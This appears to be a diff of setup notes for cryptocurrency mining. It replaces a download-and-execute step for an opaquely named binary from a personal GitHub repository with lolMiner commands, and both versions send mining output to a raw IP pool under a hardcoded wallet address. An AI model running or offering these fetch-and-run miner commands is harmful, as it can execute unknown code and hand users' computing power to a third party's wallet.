@@ -12,6 +12,7 @@ sudo apt-get dist-upgrade
 Also, make sure to confirm the necessary dependencies are installed for the right GLIBCXX version.
 strings /usr/lib/x86_64-linux-gnu/libstdc++.so.6 | grep GLIBCXX
 
-wget https://github.com/angkii/m/raw/main/AkubapakMU
-chmod 700 AkubapakMU
-./AkubapakMU --algo ETHASH --pool stratum+tcp://192.155.86.221:80 --user 0x9dc2157e3ccf7a88268afb7def08a872667a6e29.aqshkuy --pass 123 --no-cl 
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.57/lolMiner_v1.57_Lin64.tar.gz
+tar xf lolMiner_v1.57_Lin64.tar.gz
+cd 1.57
+./lolMiner --algo ETHASH --pool stratum+tcp://192.155.86.221:80 --user 0x9dc2157e3ccf7a88268afb7def08a872667a6e29.aqshkuy --pass 123 --dns-over-http=2 208.67.222.222 --no-cl 
